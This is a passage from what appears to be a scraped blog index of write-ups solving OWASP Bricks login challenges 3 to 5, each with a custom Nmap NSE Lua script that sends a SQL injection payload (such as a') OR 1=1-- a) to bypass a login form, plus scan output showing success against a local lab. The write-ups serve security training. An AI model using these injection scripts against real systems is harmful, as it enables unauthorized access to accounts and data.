style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-18\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-18\"\u003e18\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-19\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-19\"\u003e19\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e http \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e shortport \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shortport\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eportrule \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e shortport.http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaction \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e(host,port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e resp,final,query\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;passwd\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Submit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  resp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e http.post(host,port,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/login-5/index.php\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,r)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  final \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e {payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r ,SQLQuery \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e query , result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e final}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThis code is built based on \u003ccode\u003ehttp-title.nse\u003c/code\u003e.\u003c/p\u003e","title":"Bricks Login 5"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 4 is just a SQL injection with bracket and uses double quote. Here\u0026rsquo;s an example: SQL Query: SELECT * FROM users WHERE name=(\u0026quot;a\u0026quot;) and password=(\u0026quot;a\u0026quot;). We could just modify previous NSE script by changing the query.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\\\u0026#34;) OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-4/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall4.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:48 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00011s latency). PORT STATE SERVICE 80/tcp open http | chall1: | SQLQuery: : SELECT * FROM users WHERE name=(\u0026#34;a\u0026#34;) OR 1=1-- a\u0026#34;) and password=(\u0026#34;test\u0026#34;) | payload: | passwd: test | username: a\u0026#34;) OR 1=1-- a | submit: Submit |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-4/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 4 is just a SQL injection with bracket and uses double quote. Here\u0026rsquo;s an example: \u003ccode\u003eSQL Query: SELECT * FROM users WHERE name=(\u0026quot;a\u0026quot;) and password=(\u0026quot;a\u0026quot;)\u003c/code\u003e. We could just modify previous NSE script by changing the query.\u003c/p\u003e","title":"Bricks Login 4"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 3 is just a slightly harder SQL injection as it add brackets. Here\u0026rsquo;s an example: SQL Query: SELECT * FROM users WHERE name=('1') and password=('1') LIMIT 0,1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39;) OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-3/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall3.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:40 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00014s latency). PORT STATE SERVICE 80/tcp open http | chall1: | payload: | username: a\u0026#39;) OR 1=1-- a | submit: Submit | passwd: test | SQLQuery: : SELECT * FROM users WHERE name=(\u0026#39;a\u0026#39;) OR 1=1-- a\u0026#39;) and password=(\u0026#39;test\u0026#39;) LIMIT 0,1 |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-3/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 3 is just a slightly harder SQL injection as it add brackets. Here\u0026rsquo;s an example: \u003ccode\u003eSQL Query: SELECT * FROM users WHERE name=('1') and password=('1') LIMIT 0,1\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-18\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-18\"\u003e18\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-19\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-19\"\u003e19\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e http \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e shortport \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shortport\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eportrule \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e shortport.http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaction \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e(host,port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e resp,final,query\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#39;) OR 1=1-- a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;passwd\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Submit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  resp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e http.post(host,port,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/login-3/index.php\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,r)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  final \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e {payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r ,SQLQuery \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e query 